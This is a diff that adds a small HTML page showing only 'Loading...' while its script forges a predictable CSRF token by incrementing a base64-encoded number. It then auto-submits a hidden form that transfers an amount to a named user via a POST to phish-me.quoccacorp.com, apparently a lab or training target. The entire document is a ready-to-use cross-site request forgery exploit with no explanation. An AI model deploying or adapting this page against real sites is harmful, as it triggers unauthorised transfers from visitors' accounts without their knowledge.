@@ -1,0 +1,17 @@
+<body>
+<h1>Loading...</h1>
+<script>
+let last = "MjkyNw==";
+let new_token = btoa((parseInt(atob(last))+1).toString());
+let f=document.createElement('form');
+f.method='POST'; f.action='https://phish-me.quoccacorp.com/api/transfer';
+['csrf_token','username','amount'].forEach((n,i)=>{
+  let input=document.createElement('input');
+  input.type='hidden'; input.name=n;
+  input.value=[new_token,'z5508657','20'][i];
+  f.appendChild(input);
+});
+document.body.appendChild(f);
+setTimeout(()=>f.submit(),2000);
+</script>
+</body>
